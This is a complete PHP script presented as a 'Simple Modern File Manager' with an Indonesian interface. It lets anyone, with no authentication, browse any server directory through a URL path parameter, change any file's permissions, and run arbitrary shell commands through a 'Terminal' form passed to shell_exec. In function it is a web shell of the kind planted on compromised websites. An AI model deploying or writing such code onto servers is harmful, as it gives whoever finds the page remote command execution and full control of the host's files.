<?php
// =========================
// Simple Modern File Manager
// =========================

// Current working directory
$cwd = isset($_GET['path']) ? realpath($_GET['path']) : getcwd();
if (!$cwd) $cwd = getcwd();

// ------- UTILITIES -------

function perms_string($path){
    $p = fileperms($path);
    $info = ($p & 0x4000) ? 'd' : '-';
    $info .= ($p & 0x0100) ? 'r' : '-';
    $info .= ($p & 0x0080) ? 'w' : '-';
    $info .= ($p & 0x0040) ? 'x' : '-';
    $info .= ($p & 0x0020) ? 'r' : '-';
    $info .= ($p & 0x0010) ? 'w' : '-';
    $info .= ($p & 0x0008) ? 'x' : '-';
    $info .= ($p & 0x0004) ? 'r' : '-';
    $info .= ($p & 0x0002) ? 'w' : '-';
    $info .= ($p & 0x0001) ? 'x' : '-';
    return $info;
}

function writable_status($path){
    return is_writable($path);
}

function h($s){
    return htmlspecialchars($s, ENT_QUOTES,'UTF-8');
}

// ------- ACTION: CHMOD -------
$msg = "";

if (isset($_POST['action']) && $_POST['action']==='chmod') {
    $target = $_POST['target'] ?? '';
    $mode   = $_POST['mode'] ?? '';
    if ($target && $mode) {
        $path = $target;
        $oct = octdec($mode);
        if (@chmod($path, $oct)) {
            $msg = "Permission diubah ke $mode";
        } else {
            $msg = "Gagal mengubah permission";
        }
    }
}

// ------- ACTION: TERMINAL -------
$terminal_output = "";
if (isset($_POST['action']) && $_POST['action']==='terminal'){
    $cmd = trim($_POST['cmd'] ?? '');
    if ($cmd !== '') {
        $terminal_output = shell_exec("cd ".escapeshellarg($cwd)." && {$cmd} 2>&1");
    }
}

// ------- DIRECTORY LIST -------
$items = scandir($cwd);

?>
<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>PHP File Manager</title>
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css">
<style>
body { background:#0f0f11; color:#e5e5e5; }
.card-modern{ background:#16181d; border-radius:14px; }
a{ text-decoration:none; }
.badge-w{ padding:6px 10px; border-radius:10px; font-weight:600; }
.badge-ok{ background:#123f1d; color:#4cff7a; }
.badge-no{ background:#401717; color:#ff6a6a; }
input,textarea,.form-control{ background:#0f1013; color:#e5e5e5; border:1px solid #2a2c33; }
</style>
</head>
<body class="p-3">

<div class="container">

<h4 class="mb-3">📁 File Manager</h4>

<?php if($msg): ?>
<div class="alert alert-info py-2"><?=h($msg)?></div>
<?php endif; ?>

<div class="card card-modern mb-3">
<div class="card-body">

<strong>Path:</strong>
<?php
$parts = explode(DIRECTORY_SEPARATOR,$cwd);
$path="";
foreach($parts as $i=>$p){
    if($p==="") continue;
    $path .= "/$p";
    echo '<a class="text-info" href="?path='.urlencode($path).'">'.h($p).'</a>/';
}
?>
</div>
</div>

<!-- TERMINAL -->
<div class="card card-modern mb-3">
<div class="card-header fw-semibold">💻 Terminal</div>
<div class="card-body">
<form method="post" class="d-flex gap-2">
  <input type="hidden" name="action" value="terminal">
  <input class="form-control" name="cmd" placeholder="contoh: ls -la">
  <button class="btn btn-secondary">Run</button>
</form>

<?php if($terminal_output): ?>
<textarea class="form-control mt-2" rows="6" readonly><?=h($terminal_output)?></textarea>
<?php endif; ?>
</div>
</div>

<!-- FILE LIST -->
<div class="card card-modern">
<div class="card-body">

<table class="table align-middle table-dark table-hover">
<thead>
<tr>
  <th>Nama</th>
  <th>Tipe</th>
  <th>Ukuran</th>
  <th>Permission</th>
  <th>Status</th>
  <th class="text-end">Aksi</th>
</tr>
</thead>
<tbody>
<?php
foreach($items as $f){
    if($f===".."){
        $up = dirname($cwd);
        echo '<tr>
        <td><a class="text-info" href="?path='.urlencode($up).'">⬆ Parent</a></td>
        <td>dir</td><td>-</td><td>-</td><td>-</td><td></td></tr>';
        continue;
    }
    if($f===".") continue;

    $full = $cwd . DIRECTORY_SEPARATOR . $f;
    $isDir = is_dir($full);
    $perm = perms_string($full);
    $write = writable_status($full);

    echo "<tr>";
    echo "<td>";
    if($isDir){
        echo '<a class="text-info" href="?path='.urlencode($full).'">'.h($f).'</a>';
    } else {
        echo h($f);
    }
    echo "</td>";

    echo "<td>".($isDir?"Folder":"File")."</td>";

    echo "<td>".(!$isDir? filesize($full)." B" : "-")."</td>";

    echo "<td><code>$perm</code></td>";

    echo "<td>";
    if($write){
        echo '<span class="badge-w badge-ok">Writable</span>';
    } else {
        echo '<span class="badge-w badge-no">Read-Only</span>';
    }
    echo "</td>";

    // actions
    echo '<td class="text-end">
        <form method="post" class="d-inline-flex gap-1">
            <input type="hidden" name="action" value="chmod">
            <input type="hidden" name="target" value="'.h($full).'">
            <input type="text" name="mode" class="form-control form-control-sm" style="width:90px" placeholder="0755">
            <button class="btn btn-sm btn-primary">CHMOD</button>
        </form>
    </td>';

    echo "</tr>";
}
?>
</tbody>
</table>

</div>
</div>

</div>
</body>
</html>
